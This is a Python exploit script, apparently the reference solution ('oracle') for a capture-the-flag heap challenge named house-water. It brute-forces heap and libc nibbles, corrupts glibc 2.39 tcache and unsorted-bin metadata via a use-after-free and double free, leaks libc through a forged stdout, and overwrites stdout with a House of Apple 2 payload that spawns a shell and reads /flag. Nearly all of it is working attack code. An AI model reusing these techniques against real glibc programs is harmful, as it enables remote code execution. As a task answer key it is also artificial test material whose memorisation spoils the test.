#!/usr/bin/env python3
"""PHASE 4 — deterministic offline oracle for house-water (House of Water on
glibc 2.39, forced stdout-buffer libc leak, House of Apple 2 finisher).

Implements the frozen PHASE 1 recipe against tasks/house-water/src/vuln.c over
its byte-exact menu protocol (ops 1 pour / 2 drain / 3 poke / 4 moor, prompts
`weir> `, `cell size> `, `cell> `, `dive off len> `, acks
poured/freed/poked/moored plus the dud/bounds/nofit/full blur/swell/waste
errors).  No pwntools: stdlib socket/struct only.

Determinism contract (hard):
  * one fresh connection per attempt (socat fork -> fresh ASLR),
  * fixed lexicographic nibble-pair order: heap nibble 0..f outer, libc nibble
    0..f inner, two full deterministic cycles, <= 512 attempts,
  * exactly one guessed pair per attempt, never reused,
  * verdict = the stage-10 framed leak assert block (8-byte flush frame,
    0x7f pointer pattern, page-aligned libc base) — never an exit code,
  * per-attempt socket timeout 3 s.
A wrong heap nibble dies in the stage-9 win pour; a wrong libc nibble dies in
the stage-10 framing assert.  Stages 1..7 are guess-independent, so a failure
there is a recipe bug and aborts loudly; stages 8..10 failures are expected
brute-force verdicts and move to the next pair.  (Measured: ld.so maps libc on
a 64 KiB boundary, so the libc nibble is invariant 0 in practice; the effective
1/16 guess is the heap nibble, hit on the l==0 attempts.)

Recipe mapping (own constants, re-derived on the shipped 2.39, see
solution/README.md "PHASE 4" notes):
  * cell 0  X        guard/fencepost below the playground; its user pointer is
                     0x28 below the corruptme size field (forge path).
  * cell 1  playground  0x618 request -> 0x620 chunk P at heap+0x12d0.
  * cell 2  guard1      fencepost above P (top allocation).
  * pass 1: corruptme 0x408 -> P, then start_M/mid_M/end_M (0x98) and
    leftovers (0x28) carve P+0x410..P+0x620 exactly.
  * forge corruptme size to 0x621 through cell 0 and drain(3): the whole
    0x620 region goes back to the unsorted bin.
  * pass 2 (off by +0x10): corruptme' 0x418 -> P, start'/mid'/end' 0x98 at
    P+0x420/P+0x4c0/P+0x560.  Pass-2 headers alias pass-1 user pointers:
    start' header == start_M user, end' header == end_M user.
  * stage 5 shrinks start_M to 0x31 and end_M to 0x21 and frees them into
    tcache bins 1/0: entries[1] = start' header, entries[0] = end' header
    (the fake tcache struct chunk's bk/fd).
  * stage 6 writes the fake chunk's far end (heap+0x10080 = prev_size 0x10000,
    size 0x20) directly by poke offset (no guard-walk allocations needed:
    poke reaches 0x20000 forward).
  * stage 7 frees 0x3d8/0x3e8 chunks so counts[60]/counts[61] read as the
    fake size 0x10001.
  * stage 8 fills tcache[0xa0] by repeatedly freeing pass-1 mid_M (key cleared
    between frees — the drain-then-drain UAF is a double free), then frees
    end' and start' into the unsorted bin and pokes start'.fd / end'.bk low 16
    bits to heap+0x80 (1/16 heap nibble guess).
  * stage 9: pour 0x418 (class 0x420) walks the unsorted list end' -> fake ->
    start', bins the fake into the largebin and returns it split: the cell's
    user pointer is heap+0x90 = tcache entries[0].  entries[0]/[1] are left
    holding a main_arena-domain largebin head by glibc itself.
  * stage 10: retarget entries[1] low 16 bits to stdout itself (1/16 libc
    nibble guess; tcache entries hold user pointers), pour 0x28 -> the cell
    points at _IO_2_1_stdout_.  Poke 0xfbad3887 + zeroed read pointers +
    write_base LSB, then bump write_ptr low 16 bits to heap+0x4c0: the poke
    ack flush prints [heap+0x2a0, heap+0x4c6), whose 0x200-offset window holds
    the unsorted remainder's fd/bk = main_arena+0x60 (framed libc pointer:
    remainder size 0xfbe1 + fd == bk + ack bytes).
  * stage 11: overwrite the stdout struct inline with the House of Apple 2
    payload (compact: wide_data/wide_vtable point back into the struct, so
    0x1e8 bytes fit the 0x200 poke limit) and let the poke ack's fputs/fflush
    run _IO_wfile_overflow -> _IO_wdoallocbuf -> system(" sh").
"""

import os
import re
import socket
import struct
import sys
import time

HOST = os.environ.get("WATER_HOST", "reservoir")
PORT = int(os.environ.get("WATER_PORT", "1337"))
FLAG_PATH = os.environ.get("FLAG_PATH", "/flag")

# ---------------------------------------------------------------- libc 2.39
# Ubuntu 24.04 libc6 2.39-0ubuntu8.9; identical bundle to the tangerine
# sibling.  Every one of these is asserted by the run (page alignment plus
# the leak returning a main_arena-domain pointer).
LIBC_STDOUT = 0x2055C0         # _IO_2_1_stdout_
LIBC_WFILE_JUMPS = 0x203228    # _IO_wfile_jumps
LIBC_SYSTEM = 0x58750          # system
LIBC_MAIN_ARENA = 0x204AC0     # main_arena
LIBC_SYSTEM_LEAK = LIBC_MAIN_ARENA + 0x60   # unsorted bin head (fd/bk anchor)

# ------------------------------------------------------------------ layout
# Deterministic heap (heap base + these, measured against the shipped 2.39):
# tcache_perthread_struct chunk 0x290, stdout pipe-buffer chunk 0x1010, then
# X (0x30) and the playground at heap+0x12d0.
HEAP_PLAYGROUND = 0x12D0       # P, cell 1 playground chunk (class 0x620)
FAKE_LOW12 = 0x80              # fake chunk header heap+0x80
WIN_USER = FAKE_LOW12 + 0x10   # win pour user pointer = &tcache.entries[0]

# offsets from cell 0 X user pointer (heap+0x12b0)
O_CORRUPTME_SIZE = 0x28        # P+8 (forged corruptme size)
# offsets from cell 1 (playground UAF pointer, heap+0x12e0)
O_STARTM_SIZE = 0x408          # P+0x418
O_STARTP_SIZE = 0x418          # P+0x428 (repair after start_M tcache_put)
O_MIDM_KEY = 0x4B8             # P+0x4c8 (mid_M user+8, tcache key slot)
O_ENDM_SIZE = 0x548            # P+0x558
O_ENDP_SIZE = 0x558            # P+0x568 (repair after end_M tcache_put)
O_STARTP_FD = 0x420            # P+0x430
O_ENDP_BK = 0x568              # P+0x578 (end' merged with the 0x20 tail)
O_GUARD_WINDOW = 0xEDA0        # heap+0x10080 (fake chunk end)

# offsets from the win cell (heap+0x90 = &tcache.entries[0])
O_ENTRIES1 = 8                 # tcache.entries[1] (bin 0x30)
# offsets on _IO_2_1_stdout_ (the stage-10 chunk's user area)
O_STDOUT_FLAGS = 0x00
O_STDOUT_WRITE_PTR = 0x28

# stage 10/11 frame sizes (poked stdout flush + poke ack).  Both corrupted
# ack flushes put the ack string inside the window (write_ptr == window end),
# so the frame is exactly the window and nothing follows it before `weir> `.
FRAME_A = 0xA6                 # window [heap+0x200, heap+0x2a6)
FRAME_B = 0x226                # window [heap+0x2a0, heap+0x4c6)
ANCHOR_OFF_IN_B = 0x210        # remainder fd in frame B
REMAINDER_SIZE = 0xFBE1        # 0x10000 - 0x420 | PREV_INUSE

MAX_ATTEMPTS = 512
SOCKET_TIMEOUT = 3.0
SHELL_TIMEOUT = 20.0
FLAG_RE = re.compile(rb"flag\{[0-9a-f]{32}\}")


def p16(v):
    return struct.pack("<H", v & 0xFFFF)


def p64(v):
    return struct.pack("<Q", v)


def u64(b):
    return struct.unpack("<Q", b)[0]


class AttemptFailed(Exception):
    """Brute-force verdict: this (heap, libc) nibble pair is wrong."""


class RecipeBug(Exception):
    """Guess-independent stage broke: fail loudly, do not keep guessing."""


def audit(stage_name, ok, detail):
    print(f"[stage] {stage_name}: {'ok' if ok else 'FAIL'} — {detail}")
    if not ok:
        raise AssertionError(f"{stage_name}: {detail}")


class Session:
    """Byte-exact menu client for vuln.c (ops 1..4, raw byte-exact payloads)."""

    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=SOCKET_TIMEOUT)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.sock.settimeout(SOCKET_TIMEOUT)
        self.buf = b""
        self.banner = self.recv_until(b"weir> ")
        if b"reservoir 1.0" not in self.banner or b"1) pour" not in self.banner:
            raise RecipeBug(f"banner shape mismatch: {self.banner!r}")

    def send(self, data):
        self.sock.sendall(data)

    def recv_until(self, token):
        while token not in self.buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise AttemptFailed(f"EOF while waiting for {token!r}")
            self.buf += chunk
        end = self.buf.index(token) + len(token)
        out, self.buf = self.buf[:end], self.buf[end:]
        return out

    def _menu(self, op, prompt):
        self.send(f"{op}\n".encode())
        out = self.recv_until(prompt)
        if out != prompt:
            raise RecipeBug(f"prompt mismatch for op {op}: {out!r} != {prompt!r}")

    def pour(self, cell, size):
        self._menu(1, b"cell size> ")
        self.send(f"{cell} {size}\n".encode())
        out = self.recv_until(b"weir> ")
        if not out.startswith(b"poured\n"):
            raise AttemptFailed(f"pour({cell},{size:#x}) ack {out!r}")

    def drain(self, cell):
        self._menu(2, b"cell> ")
        self.send(f"{cell}\n".encode())
        out = self.recv_until(b"weir> ")
        if not out.startswith(b"freed\n"):
            raise AttemptFailed(f"drain({cell}) ack {out!r}")

    def poke(self, cell, off, data):
        self._menu(3, b"dive off len> ")
        self.send(f"{cell} {off} {len(data)}\n".encode())
        self.send(data)
        out = self.recv_until(b"weir> ")
        if b"poked\n" not in out:
            raise AttemptFailed(f"poke({cell},{off:#x},{len(data)}) ack {out!r}")
        return out

    def poke_raw(self, cell, off, data):
        """Poke whose ack output is expected to be corrupted by the pokes."""
        self._menu(3, b"dive off len> ")
        self.send(f"{cell} {off} {len(data)}\n".encode())
        self.send(data)
        return self.recv_until(b"weir> ")

    def poke_trigger(self, cell, off, data):
        """Poke fired into the corrupted stdout: its ack writer() call is the
        Apple 2 trigger, so nothing (not even an ack) is awaited."""
        self._menu(3, b"dive off len> ")
        self.send(f"{cell} {off} {len(data)}\n".encode())
        self.send(data)

    def shell_cat_flag(self):
        deadline = time.time() + SHELL_TIMEOUT
        self.sock.settimeout(0.25)
        self.send(b"cat " + FLAG_PATH.encode() + b"\n")
        out = self.buf
        while time.time() < deadline:
            if FLAG_RE.search(out):
                break
            try:
                chunk = self.sock.recv(4096)
            except TimeoutError:
                continue
            except OSError:
                break
            if not chunk:
                break
            out += chunk
        return out


def attempt(sess, heap_nibble, libc_nibble):
    """Run stages 1..10 on one fresh connection.  Returns the libc base or
    raises AttemptFailed.  Stages 1..7 do not depend on the guessed nibbles,
    so a failure there is a recipe bug: it is re-raised as RecipeBug and the
    oracle fails loudly instead of guessing forever."""
    try:
        _attempt_groom(sess, heap_nibble, libc_nibble)
    except AttemptFailed as exc:
        raise RecipeBug(f"guess-independent groom failed: {exc}")
    except RecipeBug:
        raise
    return _attempt_win(sess, heap_nibble, libc_nibble)


def _attempt_groom(sess, heap_nibble, libc_nibble):
    # ---- stage 1: staging (cell 0 X, cell 1 playground, cell 2 guard1) ----
    sess.pour(0, 0x28)
    sess.pour(1, 0x618)
    sess.pour(2, 0x28)
    sess.drain(1)
    audit("1/staging", True,
          f"X + playground(0x620 at heap+{HEAP_PLAYGROUND:#x}) + guard1 poured, "
          "playground drained")

    # ---- stage 2: pass-1 carve, exactly fills the playground ----
    sess.pour(3, 0x408)
    sess.pour(4, 0x98)
    sess.pour(5, 0x98)
    sess.pour(6, 0x98)
    sess.pour(7, 0x28)
    audit("2/carve1", True, "corruptme + start_M/mid_M/end_M + leftovers")

    # ---- stage 3: forge corruptme size to 0x621 and free it ----
    sess.poke(0, O_CORRUPTME_SIZE, p64(0x621))
    sess.drain(3)
    audit("3/forge-free", True, "corruptme size 0x621, 0x620 region unsorted")

    # ---- stage 4: pass-2 carve, +0x10 shifted ----
    sess.pour(8, 0x418)
    sess.pour(9, 0x98)
    sess.pour(10, 0x98)
    sess.pour(11, 0x98)
    audit("4/carve2", True, "corruptme' + start'/mid'/end' at +0x10")

    # ---- stage 5: fake fd/bk seeding via shrunken pass-1 frees ----
    sess.poke(1, O_STARTM_SIZE, p64(0x31))
    sess.drain(4)
    sess.poke(1, O_STARTP_SIZE, p64(0xA1))
    sess.poke(1, O_ENDM_SIZE, p64(0x21))
    sess.drain(6)
    sess.poke(1, O_ENDP_SIZE, p64(0xA1))
    audit("5/fd-bk-seed", True,
          "entries[1]=start' header, entries[0]=end' header (tcache 0x30/0x20)")

    # ---- stage 6: forge the far end of the fake chunk ----
    sess.poke(1, O_GUARD_WINDOW, p64(0x10000) + p64(0x20))
    audit("6/guard-window", True, "heap+0x10080 prev_size 0x10000 size 0x20")

    # ---- stage 7: counts[60]/counts[61] -> fake size 0x10001 ----
    sess.pour(12, 0x3D8)
    sess.drain(12)
    sess.pour(13, 0x3E8)
    sess.drain(13)
    audit("7/counts-pair", True, "counts[60]=counts[61]=1 (fake size 0x10001)")


def _attempt_win(sess, heap_nibble, libc_nibble):
    fake_low16 = (heap_nibble << 12) + FAKE_LOW12

    # ---- stage 8: fill tcache[0xa0], free the unsorted trio, p16 pokes ----
    for _ in range(7):
        sess.poke(1, O_MIDM_KEY, p64(0))
        sess.drain(5)
    sess.poke(1, O_MIDM_KEY, p64(0xA1))
    sess.drain(11)
    sess.drain(9)
    sess.poke(1, O_STARTP_FD, p16(fake_low16))
    sess.poke(1, O_ENDP_BK, p16(fake_low16))
    audit("8/unsorted-link", True,
          f"end'/start' in unsorted, fd/bk -> fake heap+0x80 (nibble {heap_nibble:x})")

    # ---- stage 9: win pour, returns heap+0x90 (tcache entries) ----
    try:
        sess.pour(14, 0x418)
    except AttemptFailed as exc:
        raise AttemptFailed(f"win pour died (heap nibble {heap_nibble:x}): {exc}")
    audit("9/win-alloc", True,
          f"pour 0x418 returned heap+{WIN_USER:#x} = tcache entries "
          f"(heap nibble {heap_nibble:x})")

    # ---- stage 10: retarget entries[1] to stdout, forced leak ----
    # tcache entries hold user pointers (tcache_get returns the entry
    # verbatim), so the low-16 overwrite targets stdout itself.
    stdout_low16 = ((libc_nibble << 12) + LIBC_STDOUT) & 0xFFFF
    sess.poke(14, O_ENTRIES1, p16(stdout_low16))
    sess.pour(15, 0x28)

    payload_a = p64(0xFBAD3887) + p64(0) * 3 + b"\x00"
    rsp_a = sess.poke_raw(15, O_STDOUT_FLAGS, payload_a)
    blob_a = rsp_a[: -len(b"weir> ")]
    if len(blob_a) != FRAME_A or blob_a[0xA0:0xA6] != b"poked\n":
        raise AttemptFailed(
            f"stdout write missed (libc nibble {libc_nibble:x}): "
            f"frame A {len(blob_a):#x} bytes")

    write_ptr_low16 = (heap_nibble << 12) + 0x4C0
    rsp_b = sess.poke_raw(15, O_STDOUT_WRITE_PTR, p16(write_ptr_low16))
    blob_b = rsp_b[: -len(b"weir> ")]
    if len(blob_b) != FRAME_B or blob_b[0x220:0x226] != b"poked\n":
        raise AttemptFailed(
            f"leak frame shape mismatch (libc nibble {libc_nibble:x}): "
            f"{len(blob_b):#x} bytes")
    if u64(blob_b[0x208:0x210]) != REMAINDER_SIZE:
        raise AttemptFailed("leak frame: unsorted remainder size mismatch")
    leak = u64(blob_b[ANCHOR_OFF_IN_B:ANCHOR_OFF_IN_B + 8])
    if u64(blob_b[ANCHOR_OFF_IN_B + 8:ANCHOR_OFF_IN_B + 16]) != leak:
        raise AttemptFailed("leak frame: fd != bk")
    # mmap-region top byte varies with host ASLR spread (0x7f on 4-level
    # paging hosts, 0x7e on wider-spread hosts): accept both, like the
    # tangerine sibling's oracle.
    if (leak >> 44) != 0x7:
        raise AttemptFailed(f"leak frame: pointer pattern {leak:#x}")
    libc = leak - LIBC_SYSTEM_LEAK
    if libc % 0x1000 or (libc >> 44) != 0x7:
        raise AttemptFailed(f"leak frame: bad libc base {libc:#x}")
    audit("10/leak", True,
          f"framed fd==bk={leak:#x} -> libc={libc:#x} "
          f"(libc nibble {libc_nibble:x})")
    return libc


def build_apple2(stdout_addr, libc):
    """Compact House of Apple 2 payload written inline over the stdout struct.

    All wide-data fields it needs live inside the same struct, so 0x1e8 bytes
    fit the 0x200 poke limit."""
    system = libc + LIBC_SYSTEM
    wide = stdout_addr + 0x100        # _wide_data we install
    wide_vtable = stdout_addr + 0x18  # fake wide jump table inside the struct
    fake = bytearray(0x1E8)
    fake[0:8] = b" sh\x00\x00\x00\x00\x00"   # _flags (system command string)
    fake[0x20:0x28] = p64(0)                 # _IO_write_base
    fake[0x28:0x30] = p64(1)                 # _IO_write_ptr > write_base
    fake[0x30:0x38] = p64(0)                 # _IO_write_end
    fake[0x68:0x70] = p64(0)                 # _chain
    # _lock must be a valid zeroed lock object: fputs' _IO_acquire_lock
    # dereferences it even in the single-threaded fast path.
    fake[0x88:0x90] = p64(stdout_addr + 0x1D0)   # zeroed lock inside payload
    fake[0xA0:0xA8] = p64(wide)              # _wide_data
    fake[0xC0:0xC8] = p64(0)                 # _mode
    fake[0xD8:0xE0] = p64(libc + LIBC_WFILE_JUMPS)   # vtable
    fake[0x80:0x88] = p64(system)            # wide_vtable->__doallocate
    fake[0x120:0x128] = p64(0)               # wide->_IO_write_base = NULL
    fake[0x138:0x140] = p64(0)               # wide->_IO_buf_base = NULL
    fake[0x1E0:0x1E8] = p64(wide_vtable)     # wide->_wide_vtable
    return bytes(fake)


def main():
    print(f"[oracle] house-water vs {HOST}:{PORT}, <= {MAX_ATTEMPTS} attempts, "
          f"lexicographic (heap, libc) nibble pairs")
    for index in range(MAX_ATTEMPTS):
        heap_nibble = (index // 16) % 16
        libc_nibble = index % 16
        try:
            sess = Session(HOST, PORT)
        except RecipeBug:
            raise
        except (OSError, EOFError) as exc:
            print(f"[attempt {index:3d}] heap={heap_nibble:x} libc={libc_nibble:x} "
                  f"-> retry (connect: {exc})")
            continue
        try:
            libc = attempt(sess, heap_nibble, libc_nibble)
        except RecipeBug:
            try:
                sess.sock.close()
            except OSError:
                pass
            raise
        except AttemptFailed as exc:
            print(f"[attempt {index:3d}] heap={heap_nibble:x} libc={libc_nibble:x} "
                  f"-> retry ({exc})")
            try:
                sess.sock.close()
            except OSError:
                pass
            continue
        except (OSError, EOFError) as exc:
            print(f"[attempt {index:3d}] heap={heap_nibble:x} libc={libc_nibble:x} "
                  f"-> retry (socket: {exc})")
            try:
                sess.sock.close()
            except OSError:
                pass
            continue

        # Winning connection: the leak assert proved arbitrary allocation
        # (the retargeted tcache bin) plus the controlled stdout write.
        # House of Apple 2 runs on this same socket, before any retry.
        print(f"[attempt {index:3d}] heap={heap_nibble:x} libc={libc_nibble:x} "
              f"-> WIN, libc={libc:#x}")
        stdout_addr = libc + LIBC_STDOUT
        payload = build_apple2(stdout_addr, libc)
        audit("11/payload", len(payload) <= 0x200,
              f"apple2 payload {len(payload):#x} bytes over stdout={stdout_addr:#x}")
        sess.poke_trigger(15, 0, payload)
        out = sess.shell_cat_flag()
        match = FLAG_RE.search(out)
        audit("11/shell-flag", match is not None,
              "system(' sh') shell returned a flag{32 hex}"
              if match else f"no flag in {out[:200]!r}")
        print(match.group(0).decode())
        return 0
    print(f"[oracle] FAILED: {MAX_ATTEMPTS} attempts exhausted without a verdict",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception as exc:  # noqa: BLE001 - oracle fails loudly
        print(f"[oracle] FAILED: {type(exc).__name__}: {exc}", file=sys.stderr)
        sys.exit(1)
